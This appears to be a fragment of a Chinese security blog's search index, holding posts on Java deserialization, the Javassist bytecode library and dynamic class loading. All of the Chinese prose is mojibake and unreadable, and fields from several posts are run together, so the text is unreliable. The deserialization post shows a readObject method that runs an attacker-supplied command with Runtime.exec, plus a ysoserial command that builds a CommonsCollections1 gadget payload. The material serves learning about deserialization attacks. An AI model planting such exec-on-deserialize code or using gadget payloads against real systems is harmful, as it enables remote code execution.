ä¸ºå…¶ä»–ä¸¤ä¸ªå˜é‡éƒ½è¢«æˆ‘è®¾ç½®ä¸ºäº†staticï¼Œæ‰€ä»¥ä¸ä¼šè¢«åºåˆ—åŒ–ï¼‰ï¼Œé‚£ä¹ˆæ˜¯å¦æƒ³è¿‡ä¸ºä»€ä¹ˆåœ¨åºåˆ—åŒ–çš„æ—¶å€™æ²¡æœ‰åºåˆ—åŒ–æ–¹æ³•ã€‚\nä¸ªäººç†è§£å¦‚ä¸‹ï¼Œå¯¹äºåºåˆ—åŒ–ï¼Œå®ƒåªåºåˆ—åŒ–å¯¹è±¡çš„çš„çŠ¶æ€ï¼Œè€Œæ–¹æ³•å±äºç±»çš„å®šä¹‰éƒ¨åˆ†ï¼Œä¸å±äºå¯¹è±¡çš„çŠ¶æ€éƒ¨åˆ†ï¼Œæ‰€ä»¥æ–¹æ³•å¹¶ä¸æ˜¯è¢«åºåˆ—åŒ–ï¼Œæ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦å†æ¬¡åˆ©ç”¨è¿™ä¸ªTestç±»ï¼Œéœ€è¦å¼•å…¥åŒ…ï¼Œä»è€Œä½¿å¾—å¯ä»¥å¯¹åº”åˆ°æ–¹æ³•æ¥åˆ©ç”¨ã€‚\nä¸¤ç§ä¸åŒç»“æœçš„åˆ©ç”¨æ–¹æ³•æœ€å¤§çš„ä¸åŒåœ¨äºä¸€ä¸ªåœ°æ–¹ï¼ŒJVMåŠ è½½è¿›ç¨‹ã€‚\nåœ¨åˆ†å¼€åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ—¶ï¼Œæ˜¯åˆ†åˆ«è¿è¡Œäº†ä¸¤æ¬¡ï¼Œå³è¿›è¡Œäº†ä¸¤æ¬¡JVMåŠ è½½ï¼Œä½†æ˜¯è¿™ä¸ªstaticé™æ€åŠ è½½æ˜¯å­˜åœ¨äºâ€œå½“å‰â€è¿›ç¨‹çš„ï¼Œå¹¶ä¸”çœ‹å‰é¢åºåˆ—åŒ–åçš„æ–‡ä»¶å†…å®¹ï¼Œæ˜¯ä¸å­˜åœ¨staticå…³é”®å­—ä¿®é¥°çš„å˜é‡çš„ï¼Œstaticä¿®é¥°çš„å˜é‡æ˜¯ç»‘å®šåœ¨å¯¹è±¡ä¸Šçš„ï¼Œè€Œæ˜¯ç›´æ¥å­˜åœ¨äºå†…å­˜ä¸­çš„ï¼Œæ‰€ä»¥åœ¨ç¬¬äºŒæ¬¡åŠ è½½æ—¶ä¼šç›´æ¥å°†å†…å­˜ä¸­å­˜åœ¨çš„fupancèµ‹å€¼ç»™nameã€‚\nè€Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ä¸€èµ·ï¼Œå¯¹æ¯”ä¸€ä¸‹ï¼ŒåŸºæœ¬å°±æ¸…æ¥šäº†ï¼ŒåŒæ—¶è¿›è¡Œï¼Œåœ¨åºåˆ—åŒ–ä¹‹å‰å°†staticä¿®é¥°çš„nameæ”¹ä¸ºhahaï¼Œå¹¶åŠ è½½è¿›äº†å†…å­˜ä¸­ï¼Œç„¶ååœ¨ååºåˆ—åŒ–æ—¶ç›´æ¥åœ¨å†…å­˜ä¸­æ‰¾åˆ°äº†è¿™ä¸ªå€¼èµ‹å€¼ç»™äº†nameã€‚\nç»¼ä¸Šï¼Œé€ æˆè¿™ä¸ªå·®å¼‚çš„ä¸»è¦æœ‰ä¸¤ä¸ªç‚¹ï¼š\nåºåˆ—åŒ–çš„ç‰¹æ€§ â€œJVNåŠ è½½ç‰¹æ€§â€ ä¸€ä¸ªçŸ¥è¯†ç‚¹ è¿™é‡Œéœ€è¦æ³¨æ„çš„ä¸€ä¸ªç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨å¾…åºåˆ—åŒ–æˆ–ååºåˆ—åŒ–çš„ç±»ä¸­å®šä¹‰readObjectå’ŒwriteObjectæ–¹æ³•ï¼Œæ¥å®ç°è‡ªå®šä¹‰çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ“ä½œï¼Œå½“ç„¶å‰ææ˜¯ï¼Œè¢«åºåˆ—åŒ–çš„ç±»å¿…é¡»æœ‰æ­¤æ–¹æ³•ï¼Œå¹¶ä¸”æ–¹æ³•çš„ä¿®é¥°ç¬¦å¿…é¡»æ˜¯privateã€‚ä»£ç å‚è€ƒå¦‚ä¸‹ï¼š\nTest.java\n1 2 3 4 5 6 7 8 9 10 package org.example; import java.io.Serializable; class Test implements Serializable{ public String cmd; private void readObject(java.io.ObjectInputStream stream) throws Exception{ stream.defaultReadObject();//è°ƒç”¨ObjectInputStreamé»˜è®¤ååºåˆ—åŒ–æ–¹æ³• Runtime.getRuntime().exec(cmd); } } Main.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package org.example; import java.io.*; class Main{ public static void main(String[] args) throws Exception{ Test haha = new Test(); haha.cmd = \u0026#34;calc\u0026#34;; ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream(\u0026#34;haha.ser\u0026#34;)); obj.writeObject(haha); obj.close(); ObjectInputStream ceshi = new ObjectInputStream(new FileInputStream(\u0026#34;haha.ser\u0026#34;)); ceshi.readObject(); ceshi.close(); } } æˆåŠŸå¼¹å‡ºè®¡ç®—æœº\nè¿™æ ·å°±ç¡®å®è‡ªå®šä¹‰äº†ååºåˆ—åŒ–çš„æ–¹æ³•ï¼Œåºåˆ—åŒ–åŒç†ã€‚\nysoserialå·¥å…· ysoserialé›†åˆäº†å„ç§javaååºåˆ—åŒ–çš„åˆ©ç”¨é“¾ã€‚\nåˆ©ç”¨é“¾ä¹Ÿå«\u0026quot;gadget chains\u0026quot;ï¼Œæˆ‘ä»¬é€šå¸¸ç§°ä¸ºgadgetã€‚\nç›´æ¥ä¸‹è½½ç¼–è¯‘å¥½çš„jaræ–‡ä»¶å°±èƒ½ç”¨ï¼š\n1 https://github.com/frohoff/ysoserial ä½¿ç”¨å¾ˆç®€å•ï¼Œå¦‚ä¸‹ç®€å•POCï¼š\n1 java -jar ysoserial-master.jar CommonsCollections1 \u0026#34;id\u0026#34; å‚è€ƒæ–‡ç« ï¼š\nhttps://javasec.org/javase/JavaDeserialization/Serialization.html\nhttps://blog.csdn.net/mocas_wang/article/details/107621010\n","date":"2025-01-22T13:20:36+08:00","permalink":"https://fupanc-w1n.github.io/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","title":"Javaååºåˆ—åŒ–"},{"content":"Java Javassist æ¦‚è¿° Java programming ASSISTantï¼ŒJavaç¼–ç¨‹åŠ©æ‰‹ã€‚æ˜¯Javaä¸­ç¼–è¾‘å­—èŠ‚ç çš„ç±»åº“ã€‚å®ƒå¯ä»¥åœ¨Javaç¨‹åºè¿è¡Œæ—¶å®šä¹‰ä¸€ä¸ªæ–°çš„ç±»ï¼Œå¹¶åŠ è½½åˆ°JVMä¸­ï¼›è¿˜å¯ä»¥åœ¨JVMåŠ è½½æ—¶ä¿®æ”¹ä¸€ä¸ªç±»æ–‡ä»¶ã€‚\nJavaä¸­æ‰€æœ‰çš„ç±»éƒ½è¢«ç¼–è¯‘ä¸ºclassæ–‡ä»¶æ¥è¿è¡Œï¼Œåœ¨ç¼–è¯‘å®Œclassæ–‡ä»¶ä¹‹åï¼Œç±»ä¸èƒ½å†è¢«æ˜¾å¼ä¿®æ”¹ï¼Œè€ŒJavassistå°±æ˜¯ç”¨æ¥å¤„ç†ç¼–è¯‘åçš„classæ–‡ä»¶ï¼Œå®ƒå¯ä»¥ç”¨æ¥ä¿®æ”¹æ–¹æ³•æˆ–è€…æ–°å¢æ–¹æ³•ï¼Œå¹¶ä¸”ä¸éœ€è¦æ·±å…¥äº†è§£å­—èŠ‚ç ï¼Œè¿˜å¯ä»¥ç”Ÿæˆä¸€ä¸ªæ–°çš„ç±»å¯¹è±¡ã€‚\nJavassistæ ¸å¿ƒAPI ClassPool è¿™ä¸ªç±»æ˜¯javassistçš„æ ¸å¿ƒç»„ä»¶ä¹‹ä¸€ã€‚ClassPoolæ˜¯CtClasså¯¹è±¡å®¹å™¨ï¼Œ\nå¸¸ç”¨æ–¹æ³•ï¼š\nClassPool getDefault()ï¼šè¿”å›é»˜è®¤çš„ClassPoolï¼Œä¸€èˆ¬é€šè¿‡è¯¥æ–¹æ³•åˆ›å»ºæˆ‘ä»¬çš„ClassPoolï¼› ClassPool insertClassPath(ClassPath cp)ï¼šå°†ä¸€ä¸ªClassPathå¯¹è±¡æ’å…¥åˆ°ç±»æœç´¢è·¯å¾„çš„èµ·å§‹ä½ç½®ï¼Œä¹Ÿå°±æ˜¯å‘ClassPoolå®¹å™¨æ’å…¥ä¸€ä¸ª.classå¯¹è±¡ã€‚ ClassPool appendClassPathï¼šå°†ä¸€ä¸ªClassPathå¯¹è±¡åŠ åˆ°ç±»æœç´¢è·¯å¾„çš„æœ«å°¾ä½ç½®ï¼› CtClass makeClass(java.lang.String classname)ï¼šæ ¹æ®ç±»ååˆ›å»ºæ–°çš„CtClasså¯¹è±¡ã€‚ç±»åå¿…é¡»æ˜¯å…¨é‡ç±»åã€‚ CtClass get(java.lang.String classname)ï¼šä»æºä¸­è¯»å–ç±»æ–‡ä»¶ï¼Œå¹¶è¿”å›å¯¹CtClassæ¥è¡¨ç¤ºå¯¹è¯¥ç±»æ–‡ä»¶çš„å¯¹è±¡çš„å¼•ç”¨ã€‚ CtClass åœ¨javassistä¸­æ¯ä¸ªéœ€è¦ç¼–è¯‘çš„classéƒ½å¯¹åº”ä¸€ä¸ªCtClasså®ä¾‹ï¼ŒCtClassï¼ˆcompile time classï¼‰ï¼Œè¿™äº›ç±»ä¼šå­˜å‚¨åœ¨ClassPoolä¸­ã€‚æ‰€ä»¥CtClasså¯¹è±¡å¿…é¡»ä»è¯¥å¯¹è±¡å®¹å™¨ä¸­è·å–ã€‚\nå¸¸ç”¨æ–¹æ³•ï¼š\nvoid setSuperclass(CtClass clazz)ï¼šæ›´æ”¹è¶…ç±»ï¼ˆçˆ¶ç±»ï¼‰ï¼Œé™¤éæ­¤å¯¹è±¡è¡¨ç¤ºæ¥å£ã€‚ byte[] toBytecode()ï¼šå°†è¯¥ç±»è½¬æ¢ä¸ºç±»æ–‡ä»¶ï¼Œå³å°†CtClasså¯¹è±¡ccè½¬æ¢ä¸ºå­—èŠ‚ç æ•°ç»„ï¼› CtConstructor makeClassInitializer()ï¼šåˆ¶ä½œä¸€ä¸ªç©ºçš„ç±»åˆå§‹åŒ–ç¨‹åºï¼ˆé™æ€æ„é€ å‡½æ•°ï¼‰ã€‚ Class x.toClass()ï¼šå°†Ctclassç±»å‹çš„å­—èŠ‚ç è½¬æ¢æˆClassç±»å‹ã€‚ CtMethod/CtField å…¶å®è¿™ä¸‰ä¸ªå¯ä»¥ç†è§£ä¸ºåŠ å¼ºç‰ˆClass/method/fieldå¯¹è±¡ã€‚åŒæ ·å¯ä»¥ä½¿ç”¨CtClassä¸­çš„CtFieldå’ŒCtMethodæ¥è·å–ç±»å¯¹è±¡ä¸­çš„å­—æ®µå’Œæ–¹æ³•ã€‚\nMaven åœ¨ä¸€ä¸ªé¡¹ç›®ä¸­ï¼Œæƒ³è¦ä½¿ç”¨å°±éœ€è¦åŠ ä¾èµ–ï¼Œ\nåœ¨POM.XMLä¸­æ·»åŠ å¦‚ä¸‹ä»£ç å³å¯ï¼ˆæ³¨æ„ä¾èµ–çš„ç‰ˆæœ¬ï¼‰ï¼š\n1 2 3 4 5 6 7 //è¿™æ ·æ‰èƒ½ä½¿ç”¨javassist \u0026lt;!-- https://mvnrepository.com/artifact/org.javassist/javassist --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.javassist\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;javassist\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.28.0-GA\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; è¯»å–ç±»/æˆå‘˜å˜é‡/æ–¹æ³•ä¿¡æ¯çš„ä»£ç  ä½¿ç”¨ClassPoolå¯¹è±¡è·å–åˆ°CtClasså¯¹è±¡åå°±å¯ä»¥åƒä½¿ç”¨Javaåå°„APIä¸€æ ·å»è¯»å–ç±»ä¿¡æ¯äº†ã€‚æœ€ç»ˆåœ¨mavené¡¹ç›®ä¸­çš„æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š\nTest.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package org.example; public class Test{ private String name; protected char yn; public int age; public void setAge(int age){ this.age = age; } protected int getAge(){ return this.age; } public Test(String name,char yn,int age){ this.age = age; this.yn = yn; this.name = name; } private String getName(){ return this.name; } } è·å–çš„æ“ä½œï¼š\nMain.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 package org.example; import javassist.ClassPool; import javassist.CtClass; import javassist.CtField; import javassist.CtMethod; import javassist.CtConstructor; public class Main{ public static void main(String[] args) throws Exception{ //è·å–ClassPoolå¯¹è±¡ ClassPool classPool = ClassPool.getDefault(); System.out.println(\u0026#34;1:\u0026#34;+classPool); //è·å–CtClasså¯¹è±¡ CtClass ctClass = classPool.getCtClass(\u0026#34;org.example.Test\u0026#34;);//è¿™é‡Œget()ç­‰åŒäºgetClass() System.out.println(\u0026#34;2:\u0026#34;+ctClass); //è·å–CtFieldå±æ€§ CtField[] ctField = ctClass.getDeclaredFields(); for(CtField x : ctField){ System.out.println(\u0026#34;3:\u0026#34;+x); } //è·å–CtMethodæ–¹æ³• CtMethod[] ctMethod = ctClass.getDeclaredMethods(); for(CtMethod x : ctMethod){ System.out.println(\u0026#34;4:\u0026#34;+x); } //è·å–CtConStructoræ„é€ æ–¹æ³• CtClass[] parameters = new CtClass[]{ classPool.get(\u0026#34;java.lang.String\u0026#34;), CtClass.charType, CtClass.intType }; CtConstructor ctConstructor = ctClass.getDeclaredConstructor(parameters); System.out.println(\u0026#34;5:\u0026#34;+ctConstructor); } } è¾“å‡ºä¸ºï¼š\n1 2 3 4 5 6 7 8 9 1:[class path: java.lang.Object.class;] 2:javassist.CtClassType@5caf905d[public class org.example.Test fields=org.example.Test.name:Ljava/lang/String;, org.example.Test.yn:C, org.example.Test.age:I, constructors=javassist.CtConstructor@3d494fbf[public Test (Ljava/lang/String;CI)V], methods=javassist.CtMethod@3ac68cb[public setAge (I)V], javassist.CtMethod@7424e08a[protected getAge ()I], javassist.CtMethod@26562bc2[private getName ()Ljava/lang/String;], ] 3:org.example.Test.name:Ljava/lang/String; 3:org.example.Test.yn:C 3:org.example.Test.age:I 4:javassist.CtMethod@3ac68cb[public setAge (I)V] 4:javassist.CtMethod@7424e08a[protected getAge ()I] 4:javassist.CtMethod@26562bc2[private getName ()Ljava/lang/String;] 5:javassist.CtConstructor@3d494fbf[public Test (Ljava/lang/String;CI)V] æ³¨æ„çœ‹è¯»å–ä»£ç è¿™é‡Œçš„ç»†èŠ‚ã€‚ä¸åå°„å¯¹æ¯”ï¼Œå°¤å…¶æ˜¯å¯¹äºå‡½æ•°å‚æ•°ç±»å‹çš„æ”¹å˜ã€‚\nä¿®æ”¹ç±»æ–¹æ³• åªéœ€è¦è°ƒç”¨CtMethodç±»çš„å¯¹åº”çš„APIï¼ŒCtMethodæä¾›äº†ç±»æ–¹æ³•ä¿®æ”¹çš„APIï¼Œå¦‚ï¼š\nsetModifiersï¼šå¯ä¿®æ”¹ç±»çš„è®¿é—®ä¿®é¥°ç¬¦ï¼Œ\ninsertBeforeå’ŒinsertAfterï¼šèƒ½å¤Ÿå®ç°åœ¨ç±»æ–¹æ³•æ‰§è¡Œçš„å‰åæ’å…¥ä»»æ„çš„Javaä»£ç ç‰‡æ®µï¼Œ\nsetBody ï¼šå¯ä»¥ä¿®æ”¹æ•´ä¸ªæ–¹æ³•çš„ä»£ç ç­‰ã€‚\nTest.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package org.example; public class Test{ private String name; protected char yn; public int age; public void setAge(int age){ this.age = age; } protected int getAge(){ return this.age; } public Test(String name,char yn,int age){ this.age = age; this.yn = yn; this.name = name; } private String getName(){ return this.name; } } Main.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package org.example; import javassist.ClassPool; import javassist.CtMethod; import javassist.CtClass; public class Main{ public static void main(String[] args) throws Exception { ClassPool classPool = ClassPool.getDefault(); CtClass ctClass = classPool.getCtClass(\u0026#34;org.example.Test\u0026#34;); //ä¿®æ”¹æ•´ä¸ªä»£ç å— CtMethod ctMethod = ctClass.getDeclaredMethod(\u0026#34;getAge\u0026#34;); ctMethod.setBody(\u0026#34;{return \\\u0026#34;haha\\\u0026#34; ;}\u0026#34;); //ä¿®æ”¹éƒ¨åˆ†ï¼Œçœ‹ä»£ç ç»“æ„ CtMethod ctMethod1 = ctClass.getDeclaredMethod(\u0026#34;setAge\u0026#34;,new CtClass[]{CtClass.intType}); ctMethod1.insertBefore(\u0026#34;System.out.println(\\\u0026#34;before is\\\u0026#34;);\u0026#34;); CtMethod ctMethod2 = ctClass.getDeclaredMethod(\u0026#34;getName\u0026#34;); ctMethod2.insertAfter(\u0026#34;System.out.println(\\\u0026#34;after is\\\u0026#34;);\u0026#34;); //è¾“å‡ºä¿®æ”¹åçš„å­—èŠ‚ç åˆ°æ–‡ä»¶ï¼Œæ–¹ä¾¿çœ‹ç»“æœ ctClass.writeFile(\u0026#34;output\u0026#34;);//è½åœ°çš„æ˜¯classæ–‡ä»¶ } } ç°åœ¨æ¥çœ‹çœ‹ä¿®æ”¹åæ—¶ä»€ä¹ˆï¼Œç»“æœå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 //Test.class package org.example; public class Test { private String name; protected char yn; public int age; public void setAge(int age) { System.out.println(\u0026#34;before is\u0026#34;); this.age = age; } protected int getAge() { return (int)\u0026#34;haha\u0026#34;; } public Test(String name, char yn, int age) { this.age = age; this.yn = yn; this.name = name; } private String getName() { String var2 = this.name; System.out.println(\u0026#34;after is\u0026#34;); return var2; } } å¯ä»¥å¯¹æ¯”ä¸€ä¸‹ä¹‹å‰çš„Test.javaçœ‹çœ‹ç»“æœã€‚\nåŠ¨æ€åˆ›å»ºä¸€ä¸ªç±» APIæä¾›ç›¸åº”çš„makeæ–¹æ³•å®ç°çš„æ“ä½œ\nçœ‹ä¸‹é¢çš„ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 package org.example; import javassist.ClassPool; import javassist.CtClass; import javassist.CtField; import javassist.CtMethod; public class Main { public static void main(String[] args) { try { // åˆ›å»ºClassPoolå¯¹è±¡ ClassPool classPool = ClassPool.getDefault(); // ä½¿ç”¨ClassPoolåˆ›å»ºä¸€ä¸ªæ–°çš„ç±» CtClass ctClass = classPool.makeClass(\u0026#34;org.example.haha\u0026#34;); // åˆ›å»ºç±»æˆå‘˜å˜é‡content CtField ctField = CtField.make(\u0026#34;private static String content = \\\u0026#34;Hello world~\\\u0026#34;;\u0026#34;, ctClass); // å°†æˆå‘˜å˜é‡æ·»åŠ åˆ°ctClasså¯¹è±¡ä¸­ ctClass.addField(ctField); // åˆ›å»ºä¸€ä¸ªä¸»æ–¹æ³•å¹¶è¾“å‡ºcontentå¯¹è±¡å€¼ CtMethod ctMethod = CtMethod.make( \u0026#34;public static void main(String[] args) { System.out.println(content); }\u0026#34;, ctClass ); // å°†æˆå‘˜æ–¹æ³•æ·»åŠ åˆ°ctClasså¯¹è±¡ä¸­ ctClass.addMethod(ctMethod); //æ ¹æ®åŒ…ç»“æ„åˆ›å»ºç›®å½•å¹¶ç”Ÿæˆæ–‡ä»¶ ctClass.writeFile(\u0026#34;output\u0026#34;); } catch (Exception e) { e.printStackTrace(); } } } å¾ˆæ¸…æ¥šï¼Œç†è§£å­¦ä¹ ä¸€ä¸‹ä»£ç å°±è¡Œäº†ï¼Œå»ºè®®åœ¨å­¦ä¹ åè‡ªå·±æ•²ä¸€éã€‚\néšåå°±ç”Ÿæˆäº†haha.class\n![image-20240622210215625](Java Javassist/image-20240622210215625.png)\nå†…å®¹ä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package org.example; public class haha { private static String content = \u0026#34;Hello world~\u0026#34;; public static void main(String[] var0) { System.out.println(content); } public haha() { } } ä¸€èˆ¬å…·ä½“ä½¿ç”¨çš„æ—¶å€™ä¼šåˆ©ç”¨åˆ°staticè¯­å¥å—ï¼Œç®€å•æ„é€ ä¸€ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package java_foundation; import javassist.*; public class Main { public static void main(String[] args) throws Exception { ClassPool classPool = ClassPool.getDefault(); CtClass ctClass = classPool.makeClass(\u0026#34;haha\u0026#34;); CtField ctField = CtField.make(\u0026#34;private String content = \\\u0026#34;111\\\u0026#34;;\u0026#34;, ctClass); ctClass.addField(ctField); CtMethod ctMethod = CtMethod.make(\u0026#34;public String getContent(){ return this.content;}\u0026#34;, ctClass); ctClass.addMethod(ctMethod); CtConstructor ctConstructor = ctClass.makeClassInitializer(); ctConstructor.insertBefore(\u0026#34;System.out.println(\\\u0026#34;123\\\u0026#34;);\u0026#34;); ctClass.writeFile(\u0026#34;output\u0026#34;); Class clazz = ctClass.toClass(); clazz.getDeclaredConstructor().newInstance(); } } æˆåŠŸåœ¨å…¬èŒå¤ªè¾“å‡º 123ã€‚\nç”Ÿæˆçš„haha.classæ–‡ä»¶å†…å®¹ä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // public class haha { private String content = \u0026#34;111\u0026#34;; public String getContent() { return this.content; } static { System.out.println(\u0026#34;123\u0026#34;); } public haha() { } } å…¶å®è¿˜æœ‰å…¶ä»–çš„APIå¯ä»¥ç”¨æ¥æ„é€ ä¸€ä¸ªç±»ä»¥åŠç±»ä¸­çš„å„ç§å±æ€§ï¼Œä½†è¿™é‡Œå°±ä¸å¤šè¯´äº†ã€‚\nä¹Ÿå¯ä»¥åˆ©ç”¨äºŒè¿›åˆ¶æ¥åŠ¨æ€åˆ›å»ºï¼Œå¦‚ä¸‹ï¼š\nä½†æ˜¯è¿™ä¸ªéœ€è¦åœ¨é¡¹ç›®ä¸­æ·»åŠ ä¾èµ–\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-io\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-io\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.8.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; ç„¶åå†è¿è¡Œä¸‹é¢è¿™ä¸ªä»£ç å³å¯\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 package org.example; import javassist.ClassPool; import javassist.CtClass; import javassist.CtField; import javassist.CtMethod; import org.apache.commons.io.FileUtils; import java.io.File; import java.util.Arrays; public class Main { public static void main(String[] args) { try { // åˆ›å»ºClassPoolå¯¹è±¡ ClassPool classPool = ClassPool.getDefault(); // ä½¿ç”¨ClassPoolåˆ›å»ºä¸€ä¸ªæ–°çš„ç±» CtClass ctClass = classPool.makeClass(\u0026#34;org.example.haha\u0026#34;); // åˆ›å»ºç±»æˆå‘˜å˜é‡content CtField ctField = CtField.make(\u0026#34;private static String content = \\\u0026#34;Hello world~\\\u0026#34;;\u0026#34;, ctClass); // å°†æˆå‘˜å˜é‡æ·»åŠ åˆ°ctClasså¯¹è±¡ä¸­ ctClass.addField(ctField); // åˆ›å»ºä¸€ä¸ªä¸»æ–¹æ³•å¹¶è¾“å‡ºcontentå¯¹è±¡å€¼ CtMethod ctMethod = CtMethod.make( \u0026#34;public static void main(String[] args) { System.out.println(content); }\u0026#34;, ctClass ); // å°†æˆå‘˜æ–¹æ³•æ·»åŠ åˆ°ctClasså¯¹è±¡ä¸­ ctClass.addMethod(ctMethod); // ä½¿ç”¨ç±»CtClassï¼Œç”Ÿæˆç±»äºŒè¿›åˆ¶ byte[] bytes = ctClass.toBytecode(); // è¾“å‡ºäºŒè¿›åˆ¶æ•°æ®åˆ°æ§åˆ¶å° System.out.println(Arrays.toString(bytes)); // å°†classäºŒè¿›åˆ¶å†…å®¹å†™å…¥åˆ°ç±»æ–‡ä»¶ File classFilePath = new File(new File(System.getProperty(\u0026#34;user.dir\u0026#34;), \u0026#34;maven_text/output/org/example\u0026#34;), \u0026#34;haha.class\u0026#34;); FileUtils.writeByteArrayToFile(classFilePath, bytes); // å°†ç”Ÿæˆçš„ç±»å†™å…¥æ–‡ä»¶ç³»ç»Ÿ ctClass.writeFile(\u0026#34;output\u0026#34;); } catch (Exception e) { e.printStackTrace(); } } } çœ‹ä¸€çœ‹ä»£ç ç†è§£ä¸€ä¸‹ã€‚\nç„¶åç”Ÿæˆå¦‚ä¸‹ç›®å½•ç»“æ„ï¼š\n![image-20240622211651698](Java Javassist/image-20240622211651698.png)\nhaha.classçš„å†…å®¹åŒä¸Šã€‚\næœ‰ä¸ªç‚¹ç¨å¾®è¯´æ˜ä¸€ä¸‹ï¼Œä½¿ç”¨å¦‚ä¸‹ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package org.example; import javassist.*; public class Main { public static void main(String[] args) throws Exception{ ClassPool classPool = ClassPool.getDefault(); CtClass ctClass = classPool.makeClass(\u0026#34;org.example.erqi\u0026#34;); CtField ctField = CtField.make(\u0026#34;public String name = \\\u0026#34;ahhaha\\\u0026#34;; \u0026#34;,ctClass); ctClass.addField(ctField); CtMethod ctMethod = CtMethod.make(\u0026#34;public void setName(String name){ this.name = name ;}\u0026#34;,ctClass); ctClass.addMethod(ctMethod); Class clazz = ctClass.toClass(); System.out.println(ctClass); System.out.println(clazz); } } è¾“å‡ºä¸ºï¼š\n1 2 3 javassist.CtNewClass@67f89fa3[hasConstructor changed frozen public class org.example.erqi fields=org.example.erqi.name:Ljava/lang/String;, constructors=javassist.CtConstructor@4ac68d3e[public erqi ()V], methods=javassist.CtMethod@ab2416c4[public setName (Ljava/lang/String;)V], ] class org.example.erqi ç»†å¿ƒçš„å¸ˆå‚…å¯èƒ½éƒ½å·²ç»å‘ç°äº†ï¼Œå¯¹äºå‰é¢æ‰€æœ‰çš„ç”¨è¿‡çš„ä»£ç ï¼Œæˆ‘ä»¬çš„æ“ä½œå±‚é¢éƒ½æ˜¯å­—èŠ‚ç ï¼Œæ‰€ä»¥ç”Ÿæˆçš„æ–‡ä»¶éƒ½æ˜¯classæ–‡ä»¶ï¼Œå¯ä»¥ç†è§£ä¸€ä¸‹è¿™ä¸ªè¾“å‡ºç»“æœã€‚\næœ€åï¼Œæ—¢ç„¶æˆ‘ä»¬éƒ½å·²ç»ç”Ÿæˆäº†.classæ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç°åœ¨å°±å¯ä»¥åˆ©ç”¨å¾ˆå¤šæ–¹æ³•äº†ï¼Œæ¯”å¦‚åŠ¨æ€åŠ è½½å­—èŠ‚ç ã€‚æ³¨æ„æ€è€ƒã€‚\nå‚è€ƒæ–‡ç« ï¼š\nhttps://cloud.tencent.com/developer/article/1815164\nhttps://blog.csdn.net/google20/article/details/144730353\nhttps://nivi4.notion.site/Java-Javassist-621beee2064a4494abe794843028449d\n","date":"2025-01-22T13:03:02+08:00","permalink":"https://fupanc-w1n.github.io/p/javassist/","title":"Javassist"},{"content":"åŠ¨æ€åŠ è½½å­—èŠ‚ç  å­—èŠ‚ç  Javaå­—èŠ‚ç æŒ‡çš„æ˜¯JVMæ‰§è¡Œä½¿ç”¨çš„ä¸€ç±»æŒ‡ä»¤ï¼Œé€šå¸¸è¢«å­˜å‚¨åœ¨.classæ–‡ä»¶ä¸­ã€‚\nåŠ è½½è¿œç¨‹/æœ¬åœ°æ–‡ä»¶ åœ¨å‰é¢ç±»åŠ è½½æœºåˆ¶çš„å­¦ä¹ ä¸­ï¼Œæ­£å¸¸æƒ…å†µä¸‹URLClassLoaderæ˜¯AppClassLoaderçš„çˆ¶ç±»ã€‚\né€šå¸¸æƒ…å†µä¸‹,Javaä¼šæ ¹æ®é…ç½®é¡¹sun.boot.class.pathå’Œjava.class.pathä¸­åˆ—ä¸¾çš„åŸºç¡€è·¯å¾„ï¼ˆè¿™äº›è·¯å¾„æ˜¯ç»è¿‡å¤„ç†åçš„java.net.URLç±»ï¼‰æ¥å¯»æ‰¾.classæ–‡ä»¶æ¥åŠ è½½ï¼Œè¿™ä¸ªåŸºç¡€è·¯å¾„æœ‰åˆ†ä¸‰ç§æƒ…å†µï¼š\nURLæœªä»¥æ–œæ /ç»“å°¾ï¼Œåˆ™è®¤ä¸ºæ˜¯ä¸€ä¸ªJaræ–‡ä»¶ï¼Œä½¿ç”¨JarLoaderæ¥å¯»æ‰¾ç±»ï¼Œå³åœ¨JaråŒ…ä¸Šå¯»æ‰¾ç±»ã€‚ 